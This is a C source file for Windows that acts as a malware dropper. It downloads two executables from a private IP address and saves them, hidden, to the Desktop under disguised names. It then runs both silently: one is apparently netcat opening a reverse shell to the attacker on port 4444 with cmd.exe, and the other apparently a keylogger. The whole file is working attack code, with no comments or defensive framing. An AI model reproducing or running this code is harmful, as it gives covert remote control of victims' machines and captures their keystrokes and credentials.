#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <Shlobj.h>


void DownloadFile(const char* url, const char* filePath)
{
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile)
    {
        FILE* file = fopen(filePath, "wb");
        if (file)
        {
            char buffer[2048];
            DWORD bytesRead; 

            do {
                InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
                fwrite(buffer, 1, bytesRead, file);
            } while (bytesRead > 0);

            fclose(file);
        }

        InternetCloseHandle(hFile);
    }

    InternetCloseHandle(hInternet);
}


int main(int argc, char* argv[]) 
{
    const char* ncurl    = "http://192.168.11.187/msvcnet.exe";
    const char* ncparams = "-d 192.168.11.187 4444 -e C:\\Windows\\System32\\cmd.exe";

    const char* kylgurl    = "http://192.168.11.187/msvcmon.exe";
    const char* kylgparams = "--out-log msvclog";

    char desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    char ncpath[MAX_PATH];
    snprintf(ncpath, MAX_PATH, "%s\\msvcnet.exe", desktopPath);

    char kylgpath[MAX_PATH];
    snprintf(kylgpath, MAX_PATH, "%s\\msvcmon.exe", desktopPath);

    DownloadFile(ncurl, ncpath);
    SetFileAttributes(ncpath, FILE_ATTRIBUTE_HIDDEN);

    DownloadFile(kylgurl, kylgpath);
    SetFileAttributes(kylgpath, FILE_ATTRIBUTE_HIDDEN);

    ShellExecute(NULL, "open", ncpath, ncparams, NULL, SW_HIDE);
    ShellExecute(NULL, "open", kylgpath, kylgparams, NULL, SW_HIDE);

    return 0;
}
